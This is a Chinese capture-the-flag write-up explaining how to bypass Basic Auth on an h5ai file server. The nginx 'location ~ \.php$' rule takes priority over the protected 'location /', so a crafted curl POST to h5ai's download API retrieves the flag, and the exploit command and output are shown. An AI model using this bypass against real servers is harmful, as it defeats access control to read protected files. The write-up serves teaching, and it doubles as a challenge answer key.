# 超简易的网盘服务器

本题的源代码在 src 文件夹下（其实本题的大部分关键代码已经在题目中给出了）。

## 解法

其实题目文案说了那么多话，关键的提取出如下信息：
1. 本题是使用开源项目 [h5ai](https://larsjung.de/h5ai/) 搭建的网盘
2. flag 就在网盘的根目录下
3. 但是网盘根目录使用 Basic Auth 进行了访问控制
4. `/Public/` 目录却是公开的（没有访问控制）

具体怎么做的呢？ 通过阅读 `dockerfile` 和 `nginx.conf` 配置文件，我们就可以知道服务是如何进行部署的了。`dockerfile` 告诉我们，`/Public` 目录下的 h5ai 是根目录下的一个软连接。nginx.conf 告诉我们 / 设置了 Basic Auth 而 `/Public` 并没有。

这时候顶级黑客的同学们可能以为小 C 找到了一个未披露的 h5ai 项目的0day 并开始对 h5ai 进行代码审计了（似乎确实有顶级黑客！）。且慢，我们再多看一眼 `nginx.conf`：

```
    location / {
        auth_basic "easy h5ai. For visitors, please refer to public directory at `/Public!`";
        auth_basic_user_file /etc/nginx/conf.d/htpasswd;
    }

    location /Public {
        allow all;
        index /Public/_h5ai/public/index.php;
    }

    location ~ \.php$ {
             fastcgi_pass   127.0.0.1:9000;
             fastcgi_index  index.php;
             fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
             include        fastcgi_params;
    }
```

我们的访问控制漏掉了什么！Nginx 软件对于 location 指令匹配的优先级规则中，`location ~ \.php$` 规则比 `location /` 有更高的优先级！似乎 PHP 的 fastcgi 相关的代码并没有被访问控制所限制！我们可以直接执行根目录下受限的 PHP 代码，因此只需要调用 h5ai 项目中的“下载” api 即可！

具体获取下载的 api 其实有很多方法，直接的方法是直接审计 h5ai 的源代码，还有就是既然 Public 是开放的，直接点击下载`nginx.conf`并观察其 HTTP Request 并加以改造即可。最终构造的 EXP 和 flag 输出如下：

```
$ curl -X POST http://202.38.93.111:10120/_h5ai/public/index.php -d "action=download&as=Public.tar&type=php-tar&baseHref=%2F&hrefs=&hrefs%5B0%5D=%2Fflag.txt" -o -
flag.txt0000755000000000000000000000003013744647043007466 0ustar00flag{super_secure_cloud}
```

### 题外话：
1. 这题改编自小 C 亲身经历，经过了戏剧化处理！其实小 C 就用类似的配置搭建过网盘，并被众所周知代号为“单位虚数”同学指出了其中错误！这个事情提醒了小 C，哪怕自认为再熟悉 Nginx 和 PHP，对待安全问题还是要保持敬畏之心。
2. 小 C 同学注意到某讨论群里有“狐狸”同学说`“这题只是小 C 同学脑子不太好使（”`。这令小 C 非常不开心，并企图决定取消该同学本题得分！最终“单位虚数”同学驳回了小 C 的该提案。
3. h5ai 是一个非常好用的开源目录系统，本题大概有不少同学对其最新版本进行了审计。有发现新漏洞或者有其他功能建议意见的同学可以到[原项目](https://github.com/lrsjng/h5ai)下提PR。原项目是 MIT 协议开源的，因本题导致的相关安全风险，小 C 毫不知情、毫无关系，无任何道德义务、直接或者间接的法律责任。